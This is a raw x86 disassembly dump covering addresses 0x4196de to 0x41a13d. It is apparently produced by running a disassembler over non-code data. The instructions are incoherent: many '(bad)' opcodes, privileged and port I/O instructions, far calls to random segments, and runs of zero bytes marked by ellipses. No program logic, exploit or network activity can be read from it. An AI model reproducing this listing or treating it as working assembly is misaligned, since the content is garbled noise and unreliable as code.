  4196de:	shl    BYTE PTR [edi+0x10a6654d],cl
  4196e4:	add    eax,0x4ab7962d
  4196e9:	inc    edx
  4196ea:	and    BYTE PTR [ebx],al
  4196ec:	ins    DWORD PTR es:[edi],dx
  4196ed:	inc    ecx
  4196ee:	loope  0x41974b
  4196f0:	xchg   edi,eax
  4196f1:	lods   al,BYTE PTR ds:[esi]
  4196f2:	jmp    0x41973a
  4196f4:	sub    al,0xdb
  4196f6:	mov    DWORD PTR [eax-0x35caefcd],esi
  4196fc:	and    al,0xaf
  4196fe:	pop    ds
  4196ff:	shr    BYTE PTR [edi-0x15ac7968],0x72
  419706:	add    esp,DWORD PTR [esi]
  419708:	repnz leave 
  41970a:	or     DWORD PTR [ebp-0x56],eax
  41970d:	(bad)  
  41970e:	dec    DWORD PTR [eax+0xd1]
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xf28dd0ae
  419781:	adc    BYTE PTR [ecx+edi*2],dl
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x78000001
  41978d:	push   edx
  41978e:	cdq    
  41978f:	adc    DWORD PTR [edi-0x46],edx
  419792:	pop    edi
  419793:	out    dx,al
  419794:	jb     0x4197fc
  419796:	sbb    eax,0x83356b8e
  41979b:	call   0x8fa5:0x79917090
  4197a2:	adc    DWORD PTR [ebp+0x55f7ab09],edx
  4197a8:	enter  0x3550,0x55
  4197ac:	stos   DWORD PTR es:[edi],eax
  4197ad:	or     ah,BYTE PTR [eax]
  4197af:	mov    eax,0x4cdadf3d
  4197b4:	lods   al,BYTE PTR ds:[esi]
  4197b5:	clc    
  4197b6:	mov    ds,ebp
  4197b8:	xchg   BYTE PTR [ebp+ecx*8+0x73],ah
  4197bc:	jmp    0x7463:0x1e03baf
  4197c3:	mov    ebx,fs
  4197c5:	mov    cs,WORD PTR [esi-0x13cf51bc]
  4197cb:	mov    cl,0x6a
  4197cd:	loop   0x4197e3
  4197cf:	jbe    0x419800
  4197d1:	jne    0x419821
  4197d3:	rsm    
  4197d5:	mov    edi,0x34b2ff30
  4197da:	adc    DWORD PTR [ebx],ebx
  4197dc:	inc    edi
  4197dd:	ins    BYTE PTR es:[edi],dx
  4197de:	inc    eax
  4197df:	dec    ebx
  4197e0:	popa   
  4197e1:	cmp    DWORD PTR [ecx],edx
  4197e3:	dec    esp
  4197e4:	fdiv   QWORD PTR [esi]
  4197e6:	and    BYTE PTR ds:0x8479aca7,cl
  4197ec:	jp     0x41984d
  4197ee:	mov    eax,0xc386e5ad
  4197f3:	fisub  DWORD PTR [ecx+0x21aaf5a9]
  4197f9:	ins    BYTE PTR es:[edi],dx
  4197fa:	mov    al,ds:0x4a6ec52b
  4197ff:	je     0x41978b
  419801:	or     dl,al
  419803:	xchg   esp,eax
  419804:	mov    esp,0x1a5c53d6
  419809:	adc    ebx,DWORD PTR [edx]
  41980b:	add    al,0x5c
  41980d:	outs   dx,BYTE PTR ds:[esi]
  41980e:	jnp    0x4197a0
  419810:	cmp    al,0xdb
  419812:	dec    esp
  419813:	repz das 
  419815:	pusha  
  419816:	out    0x63,eax
  419818:	mov    esi,eax
  41981a:	call   0x213eeb43
  41981f:	cmp    eax,0x150e4ffc
  419824:	ins    DWORD PTR es:[edi],dx
  419825:	lods   al,BYTE PTR ds:[esi]
  419826:	retf   
  419827:	pusha  
  419828:	pop    edx
  419829:	adc    esp,DWORD PTR [ecx+0x40973960]
  41982f:	jae    0x4197ca
  419831:	loop   0x419806
  419833:	ret    0xc271
  419836:	inc    ecx
  419837:	and    al,0x85
  419839:	lods   eax,DWORD PTR ds:[esi]
  41983a:	call   0x450bf79f
  41983f:	fsubr  QWORD PTR [esi]
  419841:	nop
  419842:	test   BYTE PTR [ebx-0x5c],al
  419845:	push   edi
  419846:	xchg   ch,bl
  419848:	loop   0x419894
  41984a:	sub    edi,ebp
  41984c:	lahf   
  41984d:	xchg   edi,eax
  41984e:	rcr    DWORD PTR [ebp+0x7b],1
  419851:	or     BYTE PTR [eax+edx*2-0x68],cl
  419855:	(bad)  
  419856:	(bad)  
  419857:	bound  esp,QWORD PTR es:[eax-0x69291d25]
  41985e:	xor    BYTE PTR [ecx-0x7958e694],al
  419864:	sbb    eax,0xacb78929
  419869:	out    dx,eax
  41986a:	pop    esi
  41986b:	push   edi
  41986c:	fidiv  WORD PTR [esp+esi*4]
  41986f:	pop    esp
  419870:	or     al,0x8e
  419872:	jae    0x419817
  419874:	fld    TBYTE PTR [ecx-0x7a]
  419877:	in     eax,0x7
  419879:	mov    esi,0xbd558e06
  41987e:	lods   al,BYTE PTR ds:[esi]
  41987f:	cmc    
  419880:	adc    al,0xaa
  419882:	outs   dx,DWORD PTR ds:[esi]
  419883:	lea    edx,[ecx-0xc]
  419886:	sub    DWORD PTR ds:0xd9ef2702,esp
  41988c:	xor    al,0x6d
  41988e:	pop    esp
  41988f:	iret   
  419890:	mov    ebx,0x0
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fstp   st(5)
  419901:	jecxz  0x419891
  419903:	repnz or BYTE PTR [edi],cl
  419906:	add    DWORD PTR [eax],eax
  419908:	add    eax,0x43000001
  41990d:	neg    DWORD PTR [ecx-0x52]
  419910:	sbb    bh,ah
  419912:	arpl   si,si
  419914:	pop    edx
  419915:	fild   WORD PTR [ecx+0x7a675f66]
  41991b:	repnz fild DWORD PTR [ebx+eax*4]
  41991f:	cdq    
  419920:	rcl    DWORD PTR [edi],1
  419922:	mov    WORD PTR [eax-0x7ecf0565],ss
  419928:	(bad)  
  419929:	adc    al,0x12
  41992b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41992c:	xchg   esi,eax
  41992d:	stos   BYTE PTR es:[edi],al
  41992e:	out    0xe8,eax
  419930:	xor    al,0x7a
  419932:	repnz xchg esi,eax
  419934:	and    eax,0xaf0129
  419939:	push   0xc8ececed
  41993e:	jne    0x419999
  419940:	inc    esi
  419941:	js     0x419988
  419943:	mov    ah,0x12
  419945:	pop    ds
  419946:	iret   
  419947:	xlat   BYTE PTR ds:[ebx]
  419948:	cmovbe esp,DWORD PTR [esi]
  41994b:	daa    
  41994c:	mov    edi,0x2cf11ddd
  419951:	mov    al,ds:0x5fe47c62
  419956:	add    DWORD PTR ds:0x6586bd03,0xfffffff3
  41995d:	mov    dh,0xd7
  41995f:	mov    ah,0x86
  419961:	mov    dh,0x56
  419963:	int    0x5d
  419965:	adc    ch,0xd7
  419968:	pop    ecx
  419969:	addr16 push edi
  41996b:	sbb    DWORD PTR [ebx-0x37],0x4e33d88b
  419972:	cld    
  419973:	adc    ecx,DWORD PTR ds:0x7fde6aa1
  419979:	enter  0xbbd,0x4a
  41997d:	xor    edx,DWORD PTR [ebx]
  41997f:	xchg   esp,eax
  419980:	and    al,0xa8
  419982:	pop    eax
  419983:	pusha  
  419984:	arpl   cx,sp
  419986:	rol    BYTE PTR [ecx-0x73],0x85
  41998a:	inc    edx
  41998b:	jle    0x4199e3
  41998d:	xor    al,0x56
  41998f:	jle    0x419a07
  419991:	cmp    al,0x50
  419993:	sbb    BYTE PTR [edx+edi*1+0x6dd8da80],bl
  41999a:	loopne 0x419994
  41999c:	inc    edx
  41999d:	push   ss
  41999e:	jp     0x4199b6
  4199a0:	xor    bl,BYTE PTR [edi]
  4199a2:	xchg   ebp,eax
  4199a3:	dec    edx
  4199a4:	lds    esi,FWORD PTR [esi]
  4199a6:	sbb    al,0x60
  4199a8:	xchg   edx,eax
  4199a9:	or     BYTE PTR [ebp+0x33],bl
  4199ac:	js     0x4199b2
  4199ae:	or     dl,BYTE PTR [edx+0x5a]
  4199b1:	in     eax,dx
  4199b2:	shr    WORD PTR [ebx-0x51],0x1d
  4199b7:	fcmovb st,st(5)
  4199b9:	out    0xd3,eax
  4199bb:	push   0x8b9d46d7
  4199c0:	push   cs
  4199c1:	mov    dh,0x5b
  4199c3:	pop    eax
  4199c4:	(bad)  
  4199c5:	fnstcw WORD PTR ds:0xc97902ec
  4199cb:	popa   
  4199cc:	add    BYTE PTR [ecx+0x2e],0x5e
  4199d0:	inc    edi
  4199d1:	sahf   
  4199d2:	xchg   BYTE PTR [edx],dh
  4199d4:	fidiv  DWORD PTR [edx+0x26]
  4199d7:	jo     0x419983
  4199d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199da:	call   0x4631:0xf9619261
  4199e1:	sbb    edi,DWORD PTR [ebx]
  4199e3:	sub    edx,edi
  4199e5:	adc    ecx,DWORD PTR [edx+0x230eb778]
  4199eb:	mov    ah,0xdc
  4199ed:	mov    ebp,ebx
  4199ef:	sahf   
  4199f0:	leave  
  4199f1:	dec    ecx
  4199f2:	or     BYTE PTR ds:0xe4703767,bh
  4199f8:	imul   esp,DWORD PTR [ebx+0x1b9dcdc4],0x92b287e8
  419a02:	push   0x31a25e3c
  419a07:	xchg   BYTE PTR [esi-0x9862619],ch
  419a0d:	jb     0x41999d
  419a0f:	pop    edx
  419a10:	and    eax,0x0
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x72c215d3
  419a81:	out    dx,eax
  419a82:	adc    DWORD PTR [edx+0x1100d],0x105
  419a8c:	dec    ebx
  419a8d:	stos   BYTE PTR es:[edi],al
  419a8e:	push   0x6d7fc547
  419a93:	cmp    ebx,edx
  419a95:	and    eax,0x4a4fdcb8
  419a9a:	dec    esi
  419a9b:	mov    cl,0x69
  419a9d:	jb     0x419aeb
  419a9f:	scas   al,BYTE PTR es:[edi]
  419aa0:	leave  
  419aa1:	sti    
  419aa2:	xchg   esp,eax
  419aa3:	pop    eax
  419aa4:	ret    
  419aa5:	out    0x1b,eax
  419aa7:	icebp  
  419aa8:	(bad)  
  419aa9:	dec    ebx
  419aaa:	out    0x37,al
  419aac:	mov    ecx,0x35933078
  419ab1:	popf   
  419ab2:	and    eax,0xdf5388aa
  419ab7:	pop    ss
  419ab8:	rcl    BYTE PTR [edi],1
  419aba:	push   ss
  419abb:	adc    esi,eax
  419abd:	test   BYTE PTR [esi],ch
  419abf:	pop    esp
  419ac0:	sub    ebx,ebx
  419ac2:	mov    es,WORD PTR [ebx-0x4b]
  419ac5:	aaa    
  419ac6:	add    BYTE PTR [edx+0x7ee40cbc],dh
  419acc:	or     eax,0x2a3098b3
  419ad1:	in     al,dx
  419ad2:	mov    eax,ds:0xfb737a9a
  419ad7:	mov    al,0xe1
  419ad9:	sub    DWORD PTR [ebp+0x630122eb],esp
  419adf:	and    ebp,esi
  419ae1:	and    eax,0xfafc547d
  419ae6:	sar    BYTE PTR [ebp+0x7327d1da],0xec
  419aed:	inc    edi
  419aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aef:	fdiv   st,st(5)
  419af1:	or     DWORD PTR [esi],esp
  419af3:	dec    ebp
  419af4:	or     eax,0xffffffb1
  419af7:	je     0x419afa
  419af9:	shl    DWORD PTR [eax+eiz*8],0xa
  419afd:	sub    BYTE PTR [esi+eiz*4-0x7d3498],dh
  419b04:	sbb    eax,0xe16c95b1
  419b09:	sub    bl,dl
  419b0b:	lahf   
  419b0c:	push   ss
  419b0d:	push   0x66da4392
  419b12:	inc    esp
  419b13:	pop    eax
  419b14:	sbb    DWORD PTR [ecx],ecx
  419b16:	(bad)  
  419b17:	dec    edx
  419b18:	ret    0xa05e
  419b1b:	lock or dl,BYTE PTR [ecx+0x5e]
  419b1f:	outs   dx,BYTE PTR ds:[esi]
  419b20:	fisubr DWORD PTR [ebx]
  419b22:	test   eax,0x4ccfab28
  419b27:	jbe    0x419ba0
  419b29:	cmp    eax,0x96d5d32
  419b2e:	jmp    0x419aef
  419b30:	dec    edx
  419b31:	sub    BYTE PTR [ebx],0x22
  419b34:	in     al,0xb
  419b36:	mov    cl,0x4f
  419b38:	add    DWORD PTR [edi-0x1acef7ae],0xee1822de
  419b42:	and    ah,BYTE PTR [esi+eax*8-0x751e7790]
  419b49:	sbb    al,0x70
  419b4b:	popf   
  419b4c:	imul   ecx,DWORD PTR [eax-0x1d],0xffffff91
  419b50:	mov    DWORD PTR [ebx-0x58],esp
  419b53:	icebp  
  419b54:	pop    edi
  419b55:	int    0x9b
  419b57:	inc    ecx
  419b58:	leave  
  419b59:	lahf   
  419b5a:	mov    ds:0x5b443e2a,al
  419b5f:	inc    edx
  419b60:	ja     0x419b85
  419b62:	push   ebp
  419b63:	bound  esp,QWORD PTR [edi+0x6f152f7d]
  419b69:	dec    edi
  419b6a:	add    esp,DWORD PTR [edx+0x65]
  419b6d:	das    
  419b6e:	adc    BYTE PTR [edi+0x27b79000],ah
  419b74:	sub    ecx,DWORD PTR cs:[eax+0x9]
  419b78:	das    
  419b79:	or     ah,BYTE PTR [esi+0x5]
  419b7c:	add    DWORD PTR [ebx+0x707d3d7e],esp
  419b82:	xchg   ebx,eax
  419b83:	nop
  419b84:	mov    edx,cr3
  419b87:	fsubr  DWORD PTR [edx]
  419b89:	lock cmp BYTE PTR [eax+0x342840ea],bh
  419b90:	jne    0x419b92
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xf8
  419c01:	mov    BYTE PTR [eax+0x11112df],cl
  419c07:	add    BYTE PTR ds:0x9d000001,al
  419c0d:	push   0xffffffa0
  419c0f:	nop
  419c10:	push   es
  419c11:	fnstenv [ebp+esi*1+0x3764570d]
  419c18:	int    0xf8
  419c1a:	stos   BYTE PTR es:[edi],al
  419c1b:	and    eax,0x956a4189
  419c20:	inc    ecx
  419c21:	jnp    0x419c6d
  419c23:	dec    esp
  419c24:	mul    BYTE PTR [ecx-0x6f]
  419c27:	pop    ds
  419c28:	mov    esp,0x5a14070
  419c2d:	dec    ebp
  419c2e:	xchg   ebx,eax
  419c2f:	pop    esp
  419c30:	mov    dh,0xc3
  419c32:	cmp    eax,0x3685adf7
  419c37:	arpl   WORD PTR [edx+0x1be65a31],si
  419c3d:	jmp    0x968c:0x1ed8dcb5
  419c44:	pop    edi
  419c45:	dec    edi
  419c46:	stos   DWORD PTR es:[edi],eax
  419c47:	add    BYTE PTR [ecx-0x346c38a2],dl
  419c4d:	in     al,0xe4
  419c4f:	test   esp,ebp
  419c51:	scas   eax,DWORD PTR es:[edi]
  419c52:	test   eax,0x130e5841
  419c57:	sub    BYTE PTR [edx+0x5beb30d0],dl
  419c5d:	pop    esi
  419c5e:	scas   al,BYTE PTR es:[edi]
  419c5f:	xchg   ebp,eax
  419c60:	lods   eax,DWORD PTR ds:[esi]
  419c61:	scas   al,BYTE PTR es:[edi]
  419c62:	int3   
  419c63:	popa   
  419c64:	cmp    eax,0x2641077f
  419c69:	fisttp QWORD PTR [esi+0x33a53ac2]
  419c6f:	jp     0x419cc0
  419c71:	push   0x1e
  419c73:	dec    ebp
  419c74:	add    eax,0x8337f4a6
  419c79:	sti    
  419c7a:	xchg   edi,eax
  419c7c:	cli    
  419c7d:	(bad)  
  419c7e:	lahf   
  419c7f:	test   BYTE PTR [ebp-0x52],cl
  419c82:	ja     0x419ccd
  419c84:	mov    ah,BYTE PTR [ecx+0x1c]
  419c87:	xor    eax,0xb8974401
  419c8c:	sub    dl,BYTE PTR [eax-0x1a4b46e1]
  419c92:	std    
  419c93:	pop    ecx
  419c94:	int3   
  419c95:	push   edx
  419c96:	outs   dx,DWORD PTR ds:[esi]
  419c97:	(bad)  
  419c98:	mov    esi,0xc5cb6e71
  419c9d:	or     edi,edi
  419c9f:	mov    dh,0x13
  419ca1:	jae    0x419d1c
  419ca3:	adc    dh,ah
  419ca5:	out    0x14,al
  419ca7:	pop    esi
  419ca8:	mov    ds:0xd6403e4f,al
  419cad:	mov    esi,DWORD PTR [ecx]
  419caf:	cwde   
  419cb0:	icebp  
  419cb1:	fsubr  DWORD PTR [ecx]
  419cb3:	mov    dl,0x94
  419cb5:	and    al,0xb4
  419cb7:	fwait
  419cb8:	sub    al,BYTE PTR [esi-0x3f16466e]
  419cbe:	stos   DWORD PTR es:[edi],eax
  419cbf:	in     eax,0x28
  419cc1:	ret    0x5ca6
  419cc4:	inc    ebp
  419cc5:	test   al,ah
  419cc7:	dec    ecx
  419cc8:	arpl   WORD PTR [ebp+0x6fbcce4],dx
  419cce:	mov    ds:0xe1d4b9ce,eax
  419cd3:	stos   BYTE PTR es:[edi],al
  419cd4:	enter  0x508d,0x8a
  419cd8:	jmp    0xd4baac06
  419cdd:	xor    BYTE PTR [esi+0x7d],bh
  419ce0:	hlt    
  419ce1:	push   es
  419ce2:	dec    esp
  419ce3:	fst    QWORD PTR [ecx-0x45]
  419ce6:	pop    ebx
  419ce7:	cli    
  419ce8:	xor    dh,0xad
  419ceb:	dec    esp
  419cec:	in     eax,0xb6
  419cee:	mov    esp,0x2ceb2367
  419cf3:	add    eax,0x122e354d
  419cf8:	dec    ebx
  419cf9:	and    edi,ecx
  419cfb:	ret    
  419cfc:	inc    ebp
  419cfd:	jp     0x419cd8
  419cff:	mov    ds:0xc73b53ca,al
  419d04:	into   
  419d05:	push   esi
  419d06:	xlat   BYTE PTR ds:[ebx]
  419d07:	and    esp,DWORD PTR [eax-0x683016e]
  419d0d:	xor    DWORD PTR [ecx+edx*1],edi
  419d10:	aas    
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fimul  DWORD PTR ss:[ebx+0x17af5271]
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x67000001,al
  419d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d8e:	pushf  
  419d8f:	and    al,0x97
  419d91:	xor    esi,0xffffff83
  419d94:	jae    0x419e09
  419d96:	sub    al,0x3
  419d98:	arpl   WORD PTR ds:0x7b8a30af,sp
  419d9e:	mov    ebp,0xac446952
  419da3:	test   eax,0xc23f7d9b
  419da8:	nop
  419da9:	test   BYTE PTR [ebp+0x1b62ea85],dl
  419daf:	mov    esp,DWORD PTR [ecx-0x53]
  419db2:	pop    ebp
  419db3:	sbb    bl,BYTE PTR [ebx-0x73]
  419db6:	mov    ds:0x37a27e6f,al
  419dbb:	loop   0x419e10
  419dbd:	inc    ecx
  419dbe:	mov    al,0x1f
  419dc0:	add    DWORD PTR ds:0xce853e47,0x2f
  419dc7:	xchg   ecx,eax
  419dc8:	cdq    
  419dc9:	xchg   edx,eax
  419dca:	arpl   WORD PTR [esi],dx
  419dcc:	scas   al,BYTE PTR es:[edi]
  419dcd:	in     al,0x55
  419dcf:	mov    ds:0xea80501b,al
  419dd4:	lahf   
  419dd5:	mov    esp,0xef322659
  419dda:	arpl   WORD PTR [edi-0x62],dx
  419ddd:	test   BYTE PTR [edi+eiz*1-0x62361823],dh
  419de4:	popa   
  419de5:	retf   
  419de6:	retf   0xfe88
  419de9:	add    bl,bh
  419deb:	jb     0x419d8c
  419ded:	imul   ebx,DWORD PTR [eax-0x7a0dee62],0x352593c
  419df7:	(bad)  
  419df8:	xlat   BYTE PTR ds:[ebx]
  419df9:	pusha  
  419dfa:	ja     0x419e36
  419dfc:	jbe    0x419dd9
  419dfe:	mov    ds:0x22d4f75,al
  419e03:	push   ebp
  419e04:	out    0xfc,eax
  419e06:	ret    
  419e07:	push   cs
  419e08:	sbb    eax,0xd216dcfb
  419e0d:	push   esp
  419e0e:	pop    edx
  419e0f:	mov    eax,0xd0fbc917
  419e14:	fwait
  419e15:	dec    ecx
  419e16:	or     DWORD PTR [ebx-0x24a6228f],ebx
  419e1c:	pop    ss
  419e1d:	iret   
  419e1e:	lea    ebx,[eax+0x6153eb37]
  419e24:	iret   
  419e25:	sub    bh,bl
  419e27:	or     al,0xc0
  419e29:	fidiv  WORD PTR [ecx-0x5]
  419e2c:	(bad)  
  419e2d:	js     0x419dc9
  419e2f:	addr16 mov al,ds:0x374c
  419e33:	test   eax,0x2d21db27
  419e38:	sub    eax,0xd88389a1
  419e3d:	add    BYTE PTR [edi],0x3a
  419e40:	pop    edx
  419e41:	(bad)  
  419e42:	sti    
  419e43:	std    
  419e44:	pop    edi
  419e45:	mov    cl,0x50
  419e47:	shl    DWORD PTR [edx],0xb3
  419e4a:	loope  0x419e92
  419e4c:	xor    ebp,eax
  419e4e:	adc    edi,edx
  419e50:	jne    0x419e79
  419e52:	not    BYTE PTR [eax+0x15479d82]
  419e58:	loop   0x419de7
  419e5a:	pushf  
  419e5b:	push   esi
  419e5c:	icebp  
  419e5d:	shr    esi,cl
  419e5f:	mov    dl,0x76
  419e61:	pop    ss
  419e62:	dec    eax
  419e63:	fldenv [edi+0x33f5c1cc]
  419e69:	mov    ecx,DWORD PTR [ebp+0x23]
  419e6c:	rol    bh,0x12
  419e6f:	(bad)  
  419e70:	dec    eax
  419e71:	pop    edi
  419e72:	pop    es
  419e73:	repnz daa 
  419e75:	aam    0xb0
  419e77:	mov    ah,0x70
  419e79:	rcl    edx,0xf0
  419e7c:	lods   eax,DWORD PTR ds:[esi]
  419e7d:	imul   ebp,eax,0x6d
  419e80:	or     edx,DWORD PTR [ebx+0x30c156b8]
  419e86:	push   esi
  419e87:	push   ebp
  419e88:	or     eax,0x22796e01
  419e8d:	mov    ?,WORD PTR [eax-0x44]
  419e90:	mov    eax,DWORD PTR [eax]
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	mov    ecx,?
  419f02:	out    0x35,eax
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0xc7000001
  419f0d:	jg     0x419f76
  419f0f:	lds    ebx,FWORD PTR [ebp+edi*1+0x7d58b873]
  419f16:	or     bh,BYTE PTR [eax-0x31]
  419f19:	daa    
  419f1a:	daa    
  419f1b:	pop    ss
  419f1c:	cmovns eax,DWORD PTR [ecx-0x7d]
  419f20:	push   ecx
  419f21:	jno    0x419ebb
  419f23:	aaa    
  419f24:	lods   al,BYTE PTR ds:[esi]
  419f25:	arpl   WORD PTR [ebp-0x5d],di
  419f28:	push   eax
  419f29:	pop    ebx
  419f2a:	pop    eax
  419f2b:	adc    al,0xee
  419f2d:	nop
  419f2e:	cmp    DWORD PTR [eax-0x35],esi
  419f31:	addr16 inc edi
  419f33:	adc    al,al
  419f35:	cmp    ebx,DWORD PTR [eax+0x16]
  419f38:	jge    0x419ed0
  419f3a:	push   ebx
  419f3b:	lods   eax,DWORD PTR ds:[esi]
  419f3c:	dec    esi
  419f3d:	mov    esp,gs
  419f3f:	out    dx,al
  419f40:	(bad)
  419f43:	or     ah,BYTE PTR [edx+0x6a]
  419f46:	mov    bl,BYTE PTR cs:[edi+esi*4]
  419f4a:	push   ds
  419f4b:	sbb    eax,0x147cd432
  419f50:	or     eax,0x4d7eae8c
  419f55:	pop    edi
  419f56:	rcl    BYTE PTR [ebx+0x6c],1
  419f59:	lahf   
  419f5a:	sub    bl,dh
  419f5c:	and    BYTE PTR [edx-0x64],0xe4
  419f60:	sbb    DWORD PTR [edi-0x2e1318ff],0x64b4fb35
  419f6a:	imul   edx,DWORD PTR [eax-0xf348c56],0xa47775b6
  419f74:	ja     0x419f52
  419f76:	push   ecx
  419f77:	(bad)  
  419f78:	lods   eax,DWORD PTR ds:[esi]
  419f79:	cmp    al,0x8a
  419f7b:	enter  0x2409,0x85
  419f7f:	mov    al,ds:0x9258c5c2
  419f84:	cmp    DWORD PTR [ebp-0x32],ebx
  419f87:	test   eax,0xb5644a92
  419f8c:	imul   ecx,esi,0x680e49dd
  419f92:	mov    esp,0x207377e0
  419f97:	xchg   ecx,eax
  419f98:	inc    edi
  419f99:	xchg   ebp,eax
  419f9a:	sub    BYTE PTR [ebp+0x7cd7f6cb],dh
  419fa0:	inc    edx
  419fa1:	out    0xfb,al
  419fa3:	mov    bl,0x19
  419fa5:	xchg   DWORD PTR [ecx-0xd],esp
  419fa8:	repnz mov eax,0x175630fe
  419fae:	outs   dx,BYTE PTR ds:[esi]
  419faf:	jp     0x419fb7
  419fb1:	jl     0x419fbc
  419fb3:	jae    0x419fde
  419fb5:	(bad)  
  419fb6:	cs popf 
  419fb8:	mov    BYTE PTR [edx],0x65
  419fbb:	retf   0x2a31
  419fbe:	push   cs
  419fbf:	in     al,dx
  419fc0:	stos   DWORD PTR es:[edi],eax
  419fc1:	fwait
  419fc2:	jecxz  0x41a017
  419fc4:	repz cmp bh,BYTE PTR [esi]
  419fc7:	or     dl,BYTE PTR [edi]
  419fc9:	mov    gs,ebp
  419fcb:	inc    edx
  419fcc:	int3   
  419fcd:	shr    ebx,0x2a
  419fd0:	cmp    DWORD PTR [ecx+0x48e5f3b3],ecx
  419fd6:	adc    DWORD PTR ds:0x72ca6a69,ebx
  419fdc:	inc    eax
  419fdd:	xchg   edi,eax
  419fde:	pop    ds
  419fdf:	sub    al,ch
  419fe1:	(bad)  
  419fe2:	movups xmm5,XMMWORD PTR [ebp-0x18525b4e]
  419fe9:	mov    ebp,0x88a5aa91
  419fee:	dec    edi
  419fef:	gs mov bl,bh
  419ff2:	pop    ebp
  419ff3:	ins    DWORD PTR es:[edi],dx
  419ff4:	push   ebp
  419ff5:	mov    eax,ds:0x2fcea6d9
  419ffa:	inc    ebx
  419ffb:	test   BYTE PTR [esi],dl
  419ffd:	mov    esi,0x5f444a7e
  41a002:	mov    ds:0x660c2015,eax
  41a007:	add    DWORD PTR [ebx+0x7e],esp
  41a00a:	rol    BYTE PTR [ebx],0xc3
  41a00d:	inc    esp
  41a00e:	cmp    al,0x91
  41a010:	fiadd  DWORD PTR [eax]
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x44],bh
  41a081:	push   es
  41a082:	dec    edx
  41a083:	icebp  
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0x83000001,al
  41a08d:	loope  0x41a0cc
  41a08f:	into   
  41a090:	mov    ch,0x6f
  41a092:	mov    cl,BYTE PTR [ebp+ebx*2+0x5af799f1]
  41a099:	ret    0xa779
  41a09c:	mov    edx,0xe32308e5
  41a0a1:	mov    edi,0x84904475
  41a0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a7:	jecxz  0x41a0ce
  41a0a9:	in     eax,dx
  41a0aa:	mov    bh,0x4e
  41a0ac:	cs add eax,0x18b9c64c
  41a0b2:	aam    0xf9
  41a0b4:	repnz mov cl,0x9c
  41a0b7:	adc    al,0xc7
  41a0b9:	shl    ecx,0xac
  41a0bc:	daa    
  41a0bd:	pop    ebx
  41a0be:	dec    BYTE PTR [ecx+0x5]
  41a0c1:	dec    ecx
  41a0c2:	mov    ?,WORD PTR [ebp+edx*2-0x61]
  41a0c6:	(bad)  
  41a0c7:	xlat   BYTE PTR ds:[ebx]
  41a0c8:	xchg   BYTE PTR [esp+edx*8+0x1a],bl
  41a0cc:	cmp    DWORD PTR [edi],eax
  41a0ce:	push   eax
  41a0cf:	inc    esi
  41a0d0:	and    ecx,edx
  41a0d2:	jb     0x41a13c
  41a0d4:	js     0x41a0e8
  41a0d6:	nop
  41a0d7:	pusha  
  41a0d8:	int    0x44
  41a0da:	mov    esi,0xb5c2b98d
  41a0df:	loope  0x41a13b
  41a0e1:	enter  0xf4ba,0x6f
  41a0e5:	pop    ss
  41a0e6:	pop    esi
  41a0e7:	fdiv   QWORD PTR [edx-0x49]
  41a0ea:	sbb    al,0xcd
  41a0ec:	std    
  41a0ed:	inc    edi
  41a0ee:	(bad)  
  41a0ef:	loopne 0x41a12c
  41a0f1:	xchg   eax,esi
  41a0f3:	mov    esp,edi
  41a0f5:	add    BYTE PTR [ebx-0xd],dl
  41a0f8:	(bad)  
  41a0f9:	and    BYTE PTR ds:0xd124db13,dh
  41a0ff:	xchg   ebp,eax
  41a100:	(bad)  [edi-0x42ec8691]
  41a106:	or     dh,BYTE PTR cs:[eax+0x1a]
  41a10a:	sbb    al,0x42
  41a10c:	icebp  
  41a10d:	dec    esp
  41a10e:	or     DWORD PTR [eax],0x8d886a85
  41a114:	jae    0x41a133
  41a116:	sub    eax,0xfe650484
  41a11c:	inc    ebx
  41a11d:	(bad)  
  41a11e:	jb     0x41a104
  41a120:	cmp    eax,0x3b420b75
  41a125:	sub    eax,0x7d8358d2
  41a12a:	bnd ret 
  41a12c:	rcl    esi,0x3c
  41a12f:	sti    
  41a130:	fldcw  WORD PTR [ebx]
  41a132:	imul   esp,edx,0x9a055e8
  41a138:	ja     0x41a115
  41a13a:	retf   0x2429
  41a13d:	mov    dl,0xe2
